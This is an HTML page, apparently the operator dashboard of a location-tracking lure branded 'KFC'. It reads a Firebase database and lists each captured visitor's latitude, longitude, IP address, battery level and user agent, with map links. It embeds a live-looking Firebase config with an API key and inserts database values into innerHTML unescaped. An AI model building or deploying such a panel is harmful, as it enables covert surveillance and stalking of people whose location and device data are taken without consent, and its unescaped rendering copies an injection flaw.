<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>KFC Panel - Location Monitor</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0f0f0f;
      color: #fff;
    }

    h1 {
      text-align: center;
      color: #ff0000;
      text-shadow: 0 0 10px red;
    }

    #output {
      margin-top: 20px;
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .card {
      background: #1a1a1a;
      border-left: 4px solid #ff0000;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 0 10px #ff000080;
      animation: glow 2s infinite alternate;
    }

    .card a {
      color: #00f7ff;
      text-decoration: none;
    }

    @keyframes glow {
      from {
        box-shadow: 0 0 5px #ff000080;
      }
      to {
        box-shadow: 0 0 15px #ff0000;
      }
    }
  </style>
</head>
<body>
  <h1>📍 KFC Location Panel</h1>
  <div id="output">Loading...</div>

  <!-- Firebase Compat Scripts -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <script>
    // 🔐 Replace this with YOUR actual config
  const firebaseConfig = {
  apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
  authDomain: "kfc-tracker.firebaseapp.com",
  databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
  projectId: "kfc-tracker",
  storageBucket: "kfc-tracker.firebasestorage.app",
  messagingSenderId: "127099679000",
  appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
  measurementId: "G-EPEXKK3S37"
};

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Listen to 'locations' node
    db.ref("locations").on("value", (snapshot) => {
      const data = snapshot.val();
      const output = document.getElementById("output");
      output.innerHTML = "";

      if (data) {
        Object.values(data).reverse().forEach(entry => {
          output.innerHTML += `
            <div class="card">
              📍 <b>Latitude:</b> ${entry.lat}<br>
              📍 <b>Longitude:</b> ${entry.lon}<br>
              🎯 <b>Accuracy:</b> ${entry.accuracy || "N/A"}m<br>
              🌐 <b>IP:</b> ${entry.ip}<br>
              🔋 <b>Battery:</b> ${entry.battery}<br>
              🧠 <b>User Agent:</b> ${entry.userAgent}<br>
              🗺️ <a href="https://www.google.com/maps?q=${entry.lat},${entry.lon}" target="_blank">Open in Google Maps</a>
            </div>
          `;
        });
      } else {
        output.innerHTML = "No data found.";
      }
    });
  </script>
</body>
</html>
